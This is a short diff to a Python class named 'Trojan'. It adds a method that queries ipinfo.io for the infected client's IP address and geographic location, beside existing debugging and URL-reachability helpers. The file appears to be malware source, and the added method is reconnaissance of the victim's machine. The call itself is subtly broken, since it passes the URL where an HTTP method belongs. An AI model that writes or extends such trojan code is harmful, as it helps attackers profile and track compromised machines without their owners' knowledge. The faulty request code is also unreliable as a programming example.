@@ -584,6 +584,22 @@ class Trojan:
         self.show_debug_message("Ended executing of run() method!")
 
     @staticmethod
+    def get_ip() -> dict:
+        """
+        Gets client IP adress and location.
+        :return: [dict] Dict where holds IP and location..
+        """
+
+        # Getting an request.
+        try:
+            request = requests.request("http://ipinfo.io/json").json()
+        except (json.JSONDecodeError, requests.exceptions.HTTPError, requests.exceptions.ConnectionError):
+            request = {}
+
+        # Returning request as dict.
+        return request
+
+    @staticmethod
     def url_is_reachable(url: str = "https://www.google.com/") -> bool:
         """
         Checks that given url is reachable.
